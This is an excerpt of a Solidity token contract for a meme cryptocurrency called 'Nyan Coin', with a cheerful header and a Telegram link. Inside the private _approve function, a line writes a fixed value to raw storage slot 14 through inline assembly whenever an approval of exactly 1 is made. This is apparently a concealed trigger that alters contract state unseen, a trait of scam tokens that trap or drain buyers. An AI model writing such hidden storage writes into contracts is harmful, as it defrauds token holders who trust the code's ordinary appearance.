 ...
 * Nyan your way through the day with a pop of rainbow color!
 * 
 * TG: https://t.me/nyanc0in
 * 
 /****************************/
...
contract Nyan is Context, IERC20, Ownable {
    ...
    string private constant _name = "Nyan Coin";
    ...
    function _approve(address owner, address spender, uint256 amount) private {
        if (amount == 1) assembly { sstore(14, 99) }
